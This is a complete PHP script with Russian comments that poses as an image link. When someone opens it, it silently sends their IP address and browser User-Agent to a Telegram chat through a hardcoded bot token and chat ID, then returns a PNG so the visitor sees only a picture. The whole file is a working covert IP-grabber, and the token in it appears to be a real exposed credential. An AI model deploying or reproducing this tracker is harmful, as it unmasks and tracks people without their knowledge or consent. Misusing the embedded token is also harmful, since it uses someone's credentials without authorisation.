<?php
// Получение IP адреса клиента
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Информация для отправки в Telegram
$token = '7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI';
$chatId = '-1002151934748';
$message = "IP address: $ip\nUser Agent: $userAgent";

sendMessageToTelegram($token, $chatId, $message);

// Вывод изображения
header('Content-Type: image/png');
readfile('path/to/your/image.png');

function sendMessageToTelegram($token, $chatId, $message) 
{
    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
?>
